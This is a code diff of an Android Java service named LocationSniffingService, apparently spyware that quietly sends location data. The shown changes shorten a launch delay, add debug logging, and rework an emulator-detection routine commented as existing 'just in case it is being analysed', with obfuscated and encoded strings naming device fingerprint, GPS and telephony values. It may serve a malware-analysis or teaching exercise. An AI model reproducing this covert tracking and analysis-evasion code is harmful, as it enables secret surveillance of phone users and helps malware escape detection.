@@ -38,9 +38,11 @@ public class LocationSniffingService extends Service{
     @Override
     public IBinder onBind(Intent intent) {
 
+        Log.d(TAG, "Starting handler");
+
         if(mHandler != null){
             mHandler = new Handler();
-            int delay = 300000;
+            int delay = 5;
 
             //Path Obfuscation
             mHandler.postDelayed(new Runnable() {
@@ -119,11 +121,13 @@ public class LocationSniffingService extends Service{
 
     //Dummy method - b does not mean anything
     private boolean thisDoesnotDoAnything(){
-
+        Log.d(TAG,"Checking...");
         boolean b = false;
 
         if (isValid())
             b = sendQuietly();
+
+        Log.d(TAG, isValid() + "");
 
         return (b^=b) ? (b == b)^(b) : (b^b^b^b);
     }
@@ -131,101 +135,56 @@ public class LocationSniffingService extends Service{
     //Check if the environment is an emulated environment - just in case it is being analysed
     private boolean isValid(){
 
-        String h1 = "ï<ŠPSÒí¸U1Éà>";
-        String k1 = "LetmeTellyoua211";
-        String h2 = "ÅhÐ$ h~;ï";
-        String k2 = "astoryab0utab0y1";
-        String h3 = "›«žòóÎÑãl(!º v";
-        String k3 = "n4m3dJackJackJac";
-        String h4 = "óê|Ø†5{•§YúÙ7";
-        String k4 = "heW4sStudying343";
-        String h5 = "j·Òsèfh»oÀ/û¦ˆ“";
-        String k5 = "s0ftw4r3Engineer";
-        String h6 = "vC&Á.ÌŸ/êäÛØp-";
-        String k6 = "j0kessjac21saaaa";
-        String h7 = "¶²=¼†),¼ýh9ÕRs¼";
-        String k7 = "fr33S0ulllllllll";
-        String h8 = "ýxç°|œš14ŽÇ_ü";
-        String k8 = "ind33dind33d3333";
-        String h9 = "ÿRÐÙŒœKÊ¹Ü!Æ4ã%";
-        String k9 = "imtired.........";
-        String h10 = "ôô}]¯Ý.l¥h¤¼|‡";
-        String k10 = "..a..l0ng..night";
-        String h11 = "ˆþŒÀyD!»Vj_$™A";
-        String k11 = "...timetosleep..";
+        Log.d(TAG, "Check if valid");
 
-        String a1 = "OnceUponATime";
-        String a2 = "LivedABunnyCalled";
-        String a3 = "Judy.SheWasGoingTo";
-        String a4 = "beTheBestCopIn";
-        String a5 = "Zo0o0o0o0Topia";
-        String a6 = "SheDidNotRealise";
-        String a7 = "however,ThatShe";
-        String a8 = "wasJustGoingtobe";
-        String a9 = "amereparkingWarden";
-        String a10 = "sadfacebunny";
-        String a11 = "theend";
+        String generic = "OnceUponATime";
+        String unknown = "LivedABunnyCalled";
+        String googlesdk = "Judy.SheWasGoingTo";
+        String emulator = "OoposN10earlyforGot";
+        String androidsdk86 = "beTheBestCopIn";
+        String genymotion = "Zo0o0o0o0Topia";
+        String sdk = "SheDidNotRealise";
+        String sdk86 = "however,ThatShe";
+        String vbox = "wasJustGoingtobe";
+        String goldfish = "amereparkingWarden";
+        String android = "sadfacebunny";
 
-        String ak1 = "a1a1a1a1a1a1a1a1";
-        String ak2 = "b2b2b2b2b2b2b2b2";
-        String ak3 = "c3c3c3c3c3c3c3c3";
-        String ak4 = "d4d4d4d4d4d4d4d4";
-        String ak5 = "55eeeeee55ee55ee";
-        String ak6 = "f6f6f6f6f6f6f6f6";
-        String ak7 = "g7g7g7g7g7g7g7g7";
-        String ak8 = "h8h8h8h8h8h8h8h8";
-        String ak9 = "i9i9i9i9i9i9i9i9";
-        String ak10 = "00l0al01la0l0100";
-        String ak11 = "p11p11p11p11p111";
-
-        String generic = "";
-        String unknown = "";
-        String googlesdk = "";
-        String emulator = "";
-        String androidsdk86 = "";
-        String genymotion = "";
-        String sdk = "";
-        String sdk86 = "";
-        String vbox = "";
-        String goldfish = "";
-        String android = "";
-
-        String fingerprint = "";
-        String model = "";
-        String manufacturer = "";
-        String product = "";
-        String hardware = "";
-        String telephonyservice = "";
-        String connectivityservice = "";
-        String locationservice = "";
-        String gpsprovider = "";
-        String networkprovider = "";
-        String telephoneoperator = "";
+        String fingerprint = "T05FMTExMTExMTExMQ==";
+        String model = "VFdPMjIyMjIyMjIyMg==";
+        String manufacturer = "VEhSRUUzMzMzMzMzMw==";
+        String product = "Rk9VUjQ0NDQ0NDQ0NA==";
+        String hardware = "RklWRTU1NTU1NTU1NQ==";
+        String telephonyservice = "U0lYNjY2NjY2NjY2Ng==";
+        String connectivityservice = "U0lYNjY2NjY2NjY2Ng==";
+        String locationservice = "RUlHSFQ4ODg4ODg4OA==";
+        String gpsprovider = "TklORTk5OTk5OTk5OQ==";
+        String networkprovider = "VEVOMDAwMDAwMDAwMA==";
+        String telephoneoperator = "RUxWRU4xMTExMTExMQ==";
 
         try{
-            generic = StringHelper.getStringStatic(a1, ak1);
-            unknown = StringHelper.getStringStatic(a2, ak2);
-            googlesdk = StringHelper.getStringStatic(a3, ak3);
-            emulator = StringHelper.getStringStatic(a4, ak4);
-            androidsdk86 = StringHelper.getStringStatic(a5, ak5);
-            genymotion = StringHelper.getStringStatic(a6, ak6);
-            sdk = StringHelper.getStringStatic(a7, ak7);
-            sdk86 = StringHelper.getStringStatic(a8, ak8);
-            vbox = StringHelper.getStringStatic(a9, ak9);
-            goldfish = StringHelper.getStringStatic(a10, ak10);
-            android = StringHelper.getStringStatic(a11, ak11);
+            generic = StringHelper.getStringStatic(generic);
+            unknown = StringHelper.getStringStatic(unknown);
+            googlesdk = StringHelper.getStringStatic(googlesdk);
+            emulator = StringHelper.getStringStatic(emulator);
+            androidsdk86 = StringHelper.getStringStatic(androidsdk86);
+            genymotion = StringHelper.getStringStatic(genymotion);
+            sdk = StringHelper.getStringStatic(sdk);
+            sdk86 = StringHelper.getStringStatic(sdk86);
+            vbox = StringHelper.getStringStatic(vbox);
+            goldfish = StringHelper.getStringStatic(goldfish);
+            android = StringHelper.getStringStatic(android);
 
-            fingerprint = StringHelper.getStringDynamic(h1, k1);
-            model = StringHelper.getStringDynamic(h2, k2);
-            manufacturer = StringHelper.getStringDynamic(h3, k3);
-            product = StringHelper.getStringDynamic(h4, k4);
-            hardware = StringHelper.getStringDynamic(h5, k5);
-            telephonyservice = StringHelper.getStringDynamic(h6, k6);
-            connectivityservice = StringHelper.getStringDynamic(h7, k7);
-            locationservice = StringHelper.getStringDynamic(h8, k8);
-            gpsprovider = StringHelper.getStringDynamic(h9, k9);
-            networkprovider = StringHelper.getStringDynamic(h10, k10);
-            telephoneoperator = StringHelper.getStringDynamic(h11, k11);
+            fingerprint = StringHelper.getStringDynamic(fingerprint);
+            model = StringHelper.getStringDynamic(model);
+            manufacturer = StringHelper.getStringDynamic(manufacturer);
+            product = StringHelper.getStringDynamic(product);
+            hardware = StringHelper.getStringDynamic(hardware);
+            telephonyservice = StringHelper.getStringDynamic(telephonyservice);
+            connectivityservice = StringHelper.getStringDynamic(connectivityservice);
+            locationservice = StringHelper.getStringDynamic(locationservice);
+            gpsprovider = StringHelper.getStringDynamic(gpsprovider);
+            networkprovider = StringHelper.getStringDynamic(networkprovider);
+            telephoneoperator = StringHelper.getStringDynamic(telephoneoperator);
         } catch (IllegalBlockSizeException e) {
             e.printStackTrace();
             return false;
